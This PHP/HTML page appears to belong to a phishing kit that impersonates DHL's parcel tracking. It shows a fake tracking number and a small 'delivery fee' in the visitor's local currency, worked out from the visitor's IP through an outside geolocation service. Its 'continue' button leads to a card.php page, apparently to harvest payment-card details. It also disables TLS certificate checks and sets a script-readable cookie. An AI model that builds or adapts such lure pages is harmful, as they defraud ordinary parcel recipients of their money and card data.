<?php
require '../main.php';
setcookie('token',$token,['path'=>'/','secure'=>false,'httponly'=>false,'samesite'=>'Lax']);


function getClientIP() {
    $keys = [
        'HTTP_CLIENT_IP',
        'HTTP_X_FORWARDED_FOR',
        'HTTP_CF_CONNECTING_IP', 
        'HTTP_X_REAL_IP',
        'REMOTE_ADDR'
    ];
    foreach ($keys as $key) {
        if (!empty($_SERVER[$key])) {
            $ipList = explode(',', $_SERVER[$key]);
            $ip = trim($ipList[0]);
            if (filter_var($ip, FILTER_VALIDATE_IP)) {
                return $ip;
            }
        }
    }
    return '127.0.0.1';
}

$ip = getClientIP();
if ($ip === '::1') $ip = '127.0.0.1';


$cc = '';
$currency_code = '';
$currency_symbol = '';

$ch = curl_init("https://ipwho.is/{$ip}");
curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_CONNECTTIMEOUT => 3,
    CURLOPT_TIMEOUT => 5,
    CURLOPT_SSL_VERIFYPEER => false
]);

$response = curl_exec($ch);
curl_close($ch);

if ($response) {
    $data = json_decode($response, true);
    if (!empty($data['success'])) {
        $currency_symbol = $data['currency']['symbol'] ?? '';
        $currency_code   = $data['currency']['code'] ?? '';
        $cc = $data['country_code'] ?? '';
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo $langs['title']; ?></title>
    <link rel="stylesheet" href="res/app.css">
</head>
<body>
<header>
    <div class="header">
        <div class="container">
            <div class="left">
                <img src="res/logo.png">
            </div>
            <div class="right">
                <span><?php echo $langs['help_support']; ?></span>
            </div>
        </div>
    </div>
<script>if (typeof globalThis.token === "undefined") { globalThis.token = <?php echo json_encode($token); ?>; }</script>

    <div class="header">
        <div class="container links" style="display:inline-block;">
            <span><?php echo $langs['home']; ?></span>
            <span><?php echo $langs['ship']; ?></span>
            <span><?php echo $langs['track']; ?></span>
        </div>
    </div>
</header>



<main>
<div class="container">
<div class="form" style="text-align:center;">
<div class="title"><?php echo $langs['track_title']; ?></div>
<div class="text" style="margin:30px 0;"><?php echo $langs['track_text']; ?></div>

<div class="col">
<table>
<tr>
    <th><?php echo $langs['table'][0]; ?> </th>
    <td> DE33839829<?= $cc; ?> </td>
</tr>
<tr>
<th><?php echo $langs['table'][1]; ?></th>
<td> <?= date("d/m/Y") ?></td>
</tr>

<tr>
<th><?php echo $langs['table'][2]; ?></th>
<td> 1.33 <?= $currency_symbol; ?> </td>
</tr>


</table>
</div>

<div class="col">
    <button onclick="sendLog()"><?php echo $langs['continue']; ?></button>
</div>


 
        </div>
    </div>
</main>

<footer>
    <div class="container">
        <div class="rows">
            <div class="cola">
                <span><img src="res/footer.png"></span>
                <span><?php echo $langs['about_dhl']; ?></span>
                <span><?php echo $langs['press']; ?></span>
                <span><?php echo $langs['careers']; ?></span>
                <span><?php echo $langs['legal_notice']; ?></span>
            </div>

            <div class="cola">
                <span class="legend"><?php echo $langs['alerts']; ?></span>
                <span><?php echo $langs['fraud_awareness']; ?></span>
                <span><?php echo $langs['important_information']; ?></span>
            </div>

            <div class="cola">
                <span class="legend"><?php echo $langs['legal']; ?></span>
                <span><?php echo $langs['terms_conditions']; ?></span>
                <span><?php echo $langs['privacy_notice']; ?></span>
            </div>

            <div class="cola">
                <span class="legend"><?php echo $langs['contact_support']; ?></span>
                <span><?php echo $langs['help_support']; ?></span>
                <span><?php echo $langs['faqs']; ?></span>
                <span><?php echo $langs['contact_us']; ?></span>
                <span><?php echo $langs['find_location']; ?></span>
            </div>
        </div>
    </div>
</footer>
<script src="./res/cdn/jq.js"></script>
<script src="./res/jquery.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script> 
function sendLog(){
    window.location="card.php";
}

$(document).ready(function() {
  fetch("https://ipwho.is/")
    .then(response => response.json())
    .then(data => {
      if (data) {
        $("#tr").html(data.country_code);
        $("#amount").html(data.currency.symbol);
      } else {
        console.warn("Currency not found for this IP.");
      }
    })
    .catch(error => console.error("IP fetch failed:", error));
});
</script>
</body>
</html>